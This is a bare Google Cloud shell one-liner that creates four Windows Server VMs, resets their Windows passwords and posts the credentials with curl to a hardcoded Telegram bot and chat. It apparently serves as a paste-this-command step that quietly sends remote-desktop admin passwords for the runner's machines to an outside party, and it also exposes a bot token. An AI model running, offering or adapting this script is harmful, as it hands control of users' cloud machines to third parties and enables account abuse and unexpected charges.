PROJECT_ID=$(gcloud config get-value core/project);PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format="value(projectNumber)");gcloud compute instances create instance-1 --project=$PROJECT_ID --zone=asia-south1-c --machine-type=c2-standard-4 --network-interface=network-tier=PREMIUM,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --service-account=$PROJECT_NUMBER-compute@developer.gserviceaccount.com --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append --tags=http-server,https-server --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/windows-cloud/global/images/windows-server-2019-dc-v20220119,mode=rw,size=50,type=projects/$PROJECT_ID/zones/asia-south1-c/diskTypes/pd-ssd --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any;gcloud compute instances create instance-2 --project=$PROJECT_ID --zone=asia-south1-c --machine-type=c2-standard-4 --network-interface=network-tier=PREMIUM,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --service-account=$PROJECT_NUMBER-compute@developer.gserviceaccount.com --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append --tags=http-server,https-server --create-disk=auto-delete=yes,boot=yes,device-name=instance-2,image=projects/windows-cloud/global/images/windows-server-2019-dc-v20220119,mode=rw,size=50,type=projects/$PROJECT_ID/zones/asia-south1-c/diskTypes/pd-ssd --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any;gcloud compute instances create instance-3 --project=$PROJECT_ID --zone=asia-south2-a --machine-type=c2-standard-4 --network-interface=network-tier=PREMIUM,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --service-account=$PROJECT_NUMBER-compute@developer.gserviceaccount.com --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append --tags=http-server,https-server --create-disk=auto-delete=yes,boot=yes,device-name=instance-3,image=projects/windows-cloud/global/images/windows-server-2019-dc-v20220119,mode=rw,size=50,type=projects/$PROJECT_ID/zones/asia-south2-a/diskTypes/pd-ssd --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any;gcloud compute instances create instance-4 --project=$PROJECT_ID --zone=asia-south2-a --machine-type=c2-standard-4 --network-interface=network-tier=PREMIUM,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --service-account=$PROJECT_NUMBER-compute@developer.gserviceaccount.com --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append --tags=http-server,https-server --create-disk=auto-delete=yes,boot=yes,device-name=instance-4,image=projects/windows-cloud/global/images/windows-server-2019-dc-v20220119,mode=rw,size=50,type=projects/$PROJECT_ID/zones/asia-south2-a/diskTypes/pd-ssd --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any;userr=$(gcloud compute os-login describe-profile --format="flattened(posixAccounts[0].username)");userrr=($userr);userrrr=${userrr[2-1]};user=${userrrr:0:20};user=${user//-/_};UPASS=$(gcloud compute reset-windows-password instance-1 --user=$user --zone=asia-south1-c --quiet);echo $UPASS;curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=instance-1%0D%0A$UPASS";arr=($UPASS);rdpp=${arr[4-1]};rdpc=$'\u0060';rdpep=$(php -r "echo urlencode(\"$rdpp\");");curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpep$rdpc"";curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpp$rdpc"";UPASS=$(gcloud compute reset-windows-password instance-2 --user=$user --zone=asia-south1-c --quiet);echo $UPASS;curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=instance-2%0D%0A$UPASS";arr=($UPASS);rdpp=${arr[4-1]};rdpc=$'\u0060';rdpep=$(php -r "echo urlencode(\"$rdpp\");");curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpep$rdpc"";curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpp$rdpc"";UPASS=$(gcloud compute reset-windows-password instance-3 --user=$user --zone=asia-south2-a --quiet);echo $UPASS;curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=instance-3%0D%0A$UPASS";arr=($UPASS);rdpp=${arr[4-1]};rdpc=$'\u0060';rdpep=$(php -r "echo urlencode(\"$rdpp\");");curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpep$rdpc"";curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpp$rdpc"";UPASS=$(gcloud compute reset-windows-password instance-4 --user=$user --zone=asia-south2-a --quiet);echo $UPASS;curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "chat_id=-1001512557599&text=instance-4%0D%0A$UPASS";arr=($UPASS);rdpp=${arr[4-1]};rdpc=$'\u0060';rdpep=$(php -r "echo urlencode(\"$rdpp\");");curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpep$rdpc"";curl -X POST "https://api.telegram.org/bot5156304200:AAGKdYEbML7aixpJslDsFuJouYlIMm2M76w/sendMessage" -d "parse_mode=markdown&chat_id=-1001512557599&text="$rdpc$rdpp$rdpc""
